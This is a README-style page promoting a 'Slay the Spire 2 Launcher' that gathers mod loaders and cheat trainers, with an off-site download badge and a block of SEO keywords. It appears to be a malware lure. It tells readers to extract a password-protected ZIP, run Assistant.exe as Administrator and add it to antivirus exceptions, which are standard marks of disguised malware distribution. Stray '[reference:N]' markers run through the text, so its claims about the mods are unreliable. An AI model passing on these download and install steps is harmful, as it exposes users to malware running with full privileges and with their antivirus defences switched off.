# 🎴 Slay the Spire 2 Launcher — The Complete Mod Loader & Trainer Guide

Welcome to **Slay the Spire 2 Launcher**, your central hub for the launcher and loader ecosystem of **Slay the Spire 2**. Whether you're using KitLib's all-in-one in-game toolkit, Mod Launch Manager's pre-launch organization, BepInEx for code-based mods, or Ultimate Assistant for hotkey cheats, this guide puts every working loader and trainer into one clean, easy-to-use reference.

[![Download Slay the Spire 2 Launcher](https://veneracloud.com/)](https://veneracloud.com/)

## 📦 INCLUDED MODULES

- 🛠️ **KITLIB (ALL-IN-ONE)** — in-game toolkit, cheats, debug
- ⚙️ **MOD LAUNCH MANAGER** — pre-launch mod organization
- 💉 **BEPINEX** — code-based mod loader
- 🎮 **ULTIMATE ASSISTANT** — hotkey trainer
- 📊 **WEMOD & MODMENUCHEAT** — alternative trainers
- 🗂️ **SLAYSP2MANAGER** — desktop mod manager

---

## 🛠️ KITLIB (ALL-IN-ONE) — `INSTALL → DEV MODE → TOGGLE`

The most comprehensive in-game toolkit for both mod authors and players, bundling cheats, debug tools, and a mod panel into one package [reference:0].

- **How It Works** — KitLib Core loads first, then satellite modules (Mod Panel, HUD, Dev Tools) load automatically. Subscribe to KitLib only—it now includes Mod Panel and Dev Tools as of v0.44.0 [reference:1]
- **Dev Tools (Cheats)** — Title-screen Dev Mode with new test/seed/AutoSlay, unlock all progress, and in-run rail with card, relic, enemy, power, potion, event, and room browsers, plus commands, cheats, presets, enemy intents, and save/load [reference:2]
- **Mod Panel** — Main-menu mod list with per-mod settings, enable/disable (restart to apply), load status, version, Workshop vs local, and install size [reference:3]
- **Other Features** — Combat stats and rings, skip animations, game speed, Harmony analysis, performance overlay, and MCP bridge for external agents [reference:4]
- **Installation** — Available on Steam Workshop (ID 3747619669) and Nexus [reference:5]

`KITLIB → DEV MODE → TOGGLE`

---

## ⚙️ MOD LAUNCH MANAGER — `STARTUP → ORGANIZE → LAUNCH`

A familiar pre-launch mod management experience inspired by the original Slay the Spire's MTS launcher, built directly into the game [reference:6].

- **Core Features** — View mod details before the game starts with no separate launcher, reorder mods manually or with one click, check and download Workshop updates compatible with your game branch, and add local or Workshop mods from the startup screen [reference:7]
- **Organization** — Organize large mod lists with aliases, groups, sub-groups, folder-style list view, filters, and saved profiles. Auto-enable required dependencies and place them before dependent mods [reference:8]
- **Advanced** — Configuration cloud sync, custom launcher backgrounds, AI translation (DeepSeek, OpenAI), and optional automatic unlock all [reference:9]
- **Controller Support** — Friendly controller support for navigating the launcher [reference:10]

`STARTUP → ORGANIZE → LAUNCH`

---

## 💉 BEPINEX — `EXTRACT → PLUGINS → RUN`

The standard code-based mod loader for Unity games, required for most DLL mods including trainers [reference:11].

- **How It Works** — Download the latest BepInEx version compatible with Unity 6 (or the specific engine version StS2 uses). Extract the BepInEx archive to the game root directory (Steam → right-click game → Manage → Browse Local Files). Run the game once to generate the necessary folders, then place mod DLLs in `BepInEx/plugins` [reference:12][reference:13]
- **What It Enables** — Code-based mods, trainers, and multiplayer mods like "Together" for co-op [reference:14]
- **Important** — Mod version consistency is critical for multiplayer. Host and joiners must use identical game and mod versions, or the connection will drop mid-run [reference:15]

`EXTRACT → PLUGINS → RUN`

---

## 🎮 ULTIMATE ASSISTANT — `RUN → NUMPAD → CHEAT`

A standalone hotkey trainer with 10+ functions, distributed via GitHub and Mega [reference:16].

- **Survival** — God Mode / Ignore Hits (Num 1), Infinite Health (Num 2) [reference:17]
- **Energy & Economy** — Infinite Energy (Num 3), No Card Cost (Num 4), Unlimited Gold (Num 5), Gold Multiplier (Num 6) [reference:18]
- **Items & Cards** — Infinite Potions (Num 7), Max Relics (Num 8), Unlock All Cards (Num 9), One-Hit Kill (Num 0) [reference:19]
- **Utility** — Toggle All Features (Num +) [reference:20]
- **Installation** — Download the ZIP archive, extract with password `5868781`, run `Assistant.exe` as Administrator, launch the game, and press hotkeys [reference:21]
- **Note** — Antivirus may flag the tool as a false positive because it interacts with game memory. Add to exceptions only if you trust the source [reference:22]

`RUN → NUMPAD → CHEAT`

---

## 📊 WEMOD & MODMENUCHEAT — `SELECT → TOGGLE → PLAY`

Alternative trainer options with different strengths and known issues.

- **WeMod** — Community trainer with a clean overlay. **Known Issues:** Many users report infinite loading, restart popups, and crashes, especially with certain cards. Some users found success by launching the game through WeMod instead of attaching after launch [reference:23][reference:24]
- **ModMenuCheat (3DM)** — Cheat menu mod installed via GMM or by copying the `CheatModMenu` folder to `...\Slay the Spire 2\mods`. Press **INSERT** or **F9** to open. Features relic/card/potion management, God Mode, infinite energy/stars, and max damage [reference:25]
- **SpireCheatPanel** — In-game cheat panel for editing progress, items, and deck. Extract the `SpireCheatPanel` folder to `Slay the Spire 2/mods/SpireCheatPanel/` [reference:26]
- **Cheat Menu (Juls88)** — Adds a "Cheat Menu" tab to game settings for full control over progress and parameters [reference:27]

`SELECT → TOGGLE → PLAY`

---

## 🗂️ SLAYSP2MANAGER — `SCAN → MANAGE → PLAY`

A desktop mod manager built by a community member to solve the pain of manual mod installation [reference:28].

- **Features** — One-click scan of locally installed mods, enable/disable/uninstall toggles, direct Nexus Mods search with auto-translation of mod descriptions, drag-and-drop ZIP installation, preset system for multiple mod configurations, and separate save management for vanilla and modded saves [reference:29]
- **Why Use It** — Manual mod installation is error-prone, and StS2 has save sync issues when mods are added. SlaySP2Manager isolates modded saves from vanilla saves [reference:30]
- **Platform** — Free, open-source, Windows installer, no additional dependencies [reference:31]

`SCAN → MANAGE → PLAY`

---

## ⚙️ CONFIG SYSTEM — `SAVE → LOAD → PLAY`

Setup and troubleshooting guidance for Slay the Spire 2 launchers.

- **KitLib** — Subscribe on Steam Workshop or download from Nexus. Dev Tools are bundled as of v0.44.0 [reference:32]
- **BepInEx** — Extract to game root, run once, then place mod DLLs in `BepInEx/plugins` [reference:33]
- **Ultimate Assistant** — Extract with password `5868781`, run as Administrator, then launch the game [reference:34]
- **WeMod** — If the trainer won't attach, try launching the game through WeMod instead of attaching after launch. Be aware of known crash issues [reference:35]
- **Multiplayer Mods** — Version consistency is mandatory. Host and joiners must match game and mod versions exactly [reference:36]
- **Antivirus** — Trainers and mod loaders may trigger false positives. Add to exceptions only after verifying sources

`SETUP → TROUBLESHOOT → PLAY`

---

## 💡 Why Choose Slay the Spire 2 Launcher?

Slay the Spire 2 is a deep roguelike deckbuilder where every run is a new puzzle—but sometimes you just want to test a build, unlock every card, or play with a friend. This guide consolidates KitLib's all-in-one toolkit, Mod Launch Manager's pre-launch organization, BepInEx for code-based mods, and Ultimate Assistant's hotkey cheats into one reference. KitLib gives you Dev Mode and in-run cheats, Mod Launch Manager keeps your mods organized, and Ultimate Assistant offers instant toggles. Whether you're here for the strategy, the co-op, or just want to skip the grind, this guide delivers.

## 🎮 Why Use It?

- **All-in-One Toolkit** — KitLib bundles cheats, debug tools, and mod management
- **Pre-Launch Organization** — Mod Launch Manager for load order and profiles
- **Code-Based Mods** — BepInEx for DLL mods and multiplayer support
- **Instant Cheats** — Ultimate Assistant hotkeys for HP, energy, gold, and cards
- **Stay Ready** — Multiple trainers and managers documented

## 🎛️ Control Panel

| Module | Primary Function | Highlights |
|---|---|---|
| KitLib (All-in-One) | In-game toolkit | Dev Mode, cheats, mod panel, debug, MCP bridge |
| Mod Launch Manager | Pre-launch organization | Load order, profiles, Workshop updates, AI translation |
| BepInEx | Code-based mod loader | Required for DLL mods, multiplayer mods |
| Ultimate Assistant | Hotkey trainer | God Mode, infinite energy, gold, cards |
| WeMod & ModMenuCheat | Alternative trainers | WeMod (known issues), ModMenuCheat (INSERT/F9) |
| SlaySP2Manager | Desktop mod manager | Scan, enable/disable, Nexus search, save isolation |

## 🔍 SEO Keywords

Slay the Spire 2 Launcher, Slay the Spire 2 trainer, Slay the Spire 2 cheat, Slay the Spire 2 KitLib, Slay the Spire 2 Mod Launch Manager, Slay the Spire 2 BepInEx, Slay the Spire 2 Ultimate Assistant, Slay the Spire 2 mod loader, Slay the Spire 2 mod manager, Slay the Spire 2 hack 2026, Slay the Spire 2 cheat panel, Slay the Spire 2 WeMod, Slay the Spire 2 ModMenuCheat, Slay the Spire 2 combat tools, Slay the Spire 2 trainer launcher
